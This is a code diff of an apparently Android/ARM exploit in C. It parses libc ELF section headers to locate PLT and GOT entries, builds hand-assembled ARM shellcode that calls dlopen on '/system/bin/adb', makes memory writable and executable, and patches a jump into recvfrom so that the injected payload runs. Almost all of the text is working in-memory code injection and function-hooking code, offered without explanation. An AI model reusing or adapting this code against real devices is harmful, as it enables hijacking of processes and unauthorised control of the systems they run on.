@@ -238,7 +238,7 @@ int plt_offset() {
         printf("size erro.\n");  
         return 0;  
     } else {  
-        //printf("File size is:%ld\n", (unsigned long) st.st_size);  
+        printf("File size is:%ld\n", (unsigned long) st.st_size);  
     }  
   
     fp = fopen(LIBC_PATH, "rb");  
@@ -284,68 +284,6 @@ int plt_offset() {
     }  
 }
 
-int got_memoffset(int* entry_num)
-{
-
- 	struct stat st;  
-
-    char buffer[32];
-
-    FILE* fp;
-	Elf32_Ehdr ehdr;
-	Elf32_Shdr* shdrs;
-
-    if (stat(LIBC_PATH, &st) < 0) {  
-        printf("size erro.\n");  
-        return 0;  
-    } else {  
-       // printf("File size is:%ld\n", (unsigned long) st.st_size);  
-    }  
-  
-    fp = fopen(LIBC_PATH, "rb");  
-    if (fp == NULL) {  
-        printf("Open failed.\n");  
-    } else {  
-    
-	    //read ehdr
-	    fseek(fp, 0, SEEK_SET);  
-	    fread(&ehdr, sizeof(Elf32_Ehdr), 1, fp);  
-
-	   	//read shdrs	
-	    //printf("section num %d, section hdr size %d.\n", ehdr.e_shnum, ehdr.e_shentsize);
-	    shdrs = malloc(ehdr.e_shnum * ehdr.e_shentsize);
-
-	   	int i, offset = 0;
-	    for ( i = 0; i < ehdr.e_shnum; i++) {
-	    	fseek(fp, ehdr.e_shoff+offset, SEEK_SET );  
-    		fread(&shdrs[i], ehdr.e_shentsize, 1, fp); 
-    		//printf("[*] section header offset %08lx, section offset %08lx \n",ehdr.e_shoff+offset, shdrs[i].sh_offset);
-    		offset+=ehdr.e_shentsize;
-    	}
-
-    	offset = 0;
-    	long int table=shdrs[ehdr.e_shstrndx].sh_offset;
-    	//printf("[*] string table @ section[%d] %08lx\n", ehdr.e_shstrndx, table);
-    	if(ehdr.e_shstrndx!=SHN_UNDEF) {
-    		for ( i = 0; i < ehdr.e_shnum; i++ ) {
-		    	fseek(fp,table+shdrs[i].sh_name,SEEK_SET);  
-		    	fread(buffer,32,1,fp);
-		    	//printf("%s : %04X\n", buffer, shdrs[i].sh_addr);
-
-		        if(0==strcmp(buffer, ".got")){
-					//printf(".got: %04X\n", buffer, shdrs[i].sh_addr);
-					offset = shdrs[i].sh_addr;
-					*entry_num = shdrs[i].sh_size/4;
-					break;
-				}
-    		}
-		}
-		free(shdrs);
-	    fclose(fp);
-	    return offset; 
-    }  
-}
-
 int main(int argc, char *argv[])
 {
 	unsigned start, end;
@@ -359,58 +297,38 @@ int main(int argc, char *argv[])
 				"\x00\x00\x50\xe3"
 				"\x01\x00\x00\x0a"
 				"\xff\x40\xbd\xe8"
-				"\x0a\x00\x00\xea"
+				"\x09\x00\x00\xea"
 				//dlopen
 				"\x0f\x00\xa0\xe1"
-				"\x44\x00\x80\xe2"
+				"\x48\x00\x80\xe2"
 				"\x00\x10\xa0\xe3"
 				"\x03\x30\x43\xe0"
 				"\x0f\x30\x83\xe0"
-				"\x4c\x30\x83\xe2"
+				"\x48\x30\x83\xe2"
 				"\x00\x30\x93\xe5"
 				"\x03\x30\x8f\xe0"
-				"\x00\x30\x93\xe5"
 				"\x33\xff\x2f\xe1"
 				"\xff\x40\xbd\xe8"
 				//org_fun
-				"\x07\xc0\xa0\xe1"
-				"\x30\x70\x9f\xe5"
+				"\x0d\xc0\xa0\xe1"
+				"\xf0\x00\x2d\xe9"
+				"\x70\x00\x9c\xe8"
+				"\x49\x7f\xa0\xe3"
 				"\x00\x00\x00\xef"
-				"\x0c\x70\xa0\xe1"
+				"\xf0\x00\xbd\xe8"
 				"\x01\x0a\x70\xe3"
 				"\x1e\xff\x2f\x91"
 				"\x00\x00\x60\xe2"
 				"\x00\x00\x00\xea"
-                "\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x61\x64\x62\x00\x00\x00\x00\x00"
-                "\x00\x00\x00\x00"
-                "\x00\x00\x00\x00"
-                "\x07\x01\x00\x00";
+                "\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x61\x64\x62\x00\x00\x00\x00\x00";
  
 	//sleep(30);
-	
     if (get_range(&start, &end) != 0)
 		errx(1, "failed to get range");
 
-	int vaddr_dlopen   = get_func_addr("dlopen");
-	printf("[*] dlopen vitual addr: %08lx\n", vaddr_dlopen);
-
-	int got_entrynum= 0;
-	int got_addr_off = got_memoffset(&got_entrynum);
-	int got_addr = start + got_addr_off;
-
-	printf("[*] got_addr vitual addr: %08lx, num : %d\n", got_addr, got_entrynum);
-
-	for(i = 0; i < got_entrynum; i++){
-		if ( ((int*)got_addr)[i] == vaddr_dlopen ){
-			printf("[*] dlopen @ got %d\n", i);
-			break;
-		}
-	}
-
-
-	int dlopen_offset = got_addr_off + i * 4;
-	char* vaddr_dlopen_got = start + dlopen_offset;
-	char* vaddr_recvfrom   = get_func_addr("clock_gettime");
+	int dlopen_offset = plt_offset() + 0x20; //dlopen elf offset in plt
+	char* vaddr_dlopen_plt = start + dlopen_offset;
+	char* vaddr_recvfrom   = get_func_addr("recvfrom");
 	int   vaddr_payload = (void*)(end - 0x90);
 
 	//get addr of set_errno
@@ -424,18 +342,18 @@ int main(int argc, char *argv[])
 	}
 
 	printf("[*]pid: %d, recv_from: %08lx, vaddr_set_errno: %08lx, vaddr_dlopen_plt: %08lx, vaddr_payload: %08lx\n", 
-		getpid(), vaddr_recvfrom, vaddr_set_errno, vaddr_dlopen_got, vaddr_payload);
+		getpid(), vaddr_recvfrom, vaddr_set_errno, vaddr_dlopen_plt, vaddr_payload);
 
 
-    dlopen_offset = vaddr_dlopen_got - vaddr_payload - 0x48 ;
-    set_errno_offset = vaddr_set_errno - (vaddr_payload + 0x6c + 8);//8074:	eafffff5 	b	8050 <org_fun>
+    dlopen_offset = vaddr_dlopen_plt - vaddr_payload - 0x48 ;
+    set_errno_offset = vaddr_set_errno - (vaddr_payload + 0x70 + 8);
 
-    *(int*)&SC[0x6c] = set_errno_offset/4;//8074:	eafffff5 	b	8050 <org_fun>
-    *(char*)&SC[0x6f] = 0xea;//8074:	eafffff5 	b	8050 <org_fun>
-    *(int*)&SC[0x88] = dlopen_offset;
+    *(int*)&SC[0x70] = set_errno_offset/4;
+    *(char*)&SC[0x73] = 0xea;
+    *(int*)&SC[0x84] = dlopen_offset;
     printf("dlopen_offset = %08lx", dlopen_offset);
     patch(vaddr_payload, SC, 0x90);
-
+    
     
     char JMP[] = "\x04\xc0\x9f\xe5\x0c\xc0\x8f\xe0\x1c\xff\x2f\xe1\x00\x00\x00\x00";
     int offset = (int)vaddr_payload-(int)vaddr_recvfrom;
@@ -444,11 +362,13 @@ int main(int argc, char *argv[])
     patch(vaddr_recvfrom, JMP, 16);           
     exit(0);
 
+
     void * addr;
   	addr = (void *)((int)vaddr_recvfrom & (~(PAGE_SIZE - 1)));
     mprotect (addr, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC);
+    printf("getuid() = %d\n", recvfrom(0,0,0,0,0,0));
  	memcpy(vaddr_recvfrom, JMP, 16);
-	printf("getuid() = %d\n", clock_gettime(0,0));
+	printf("getuid() = %d\n", recvfrom(0,0,0,0,0,0));
 
 
 	exit(0);
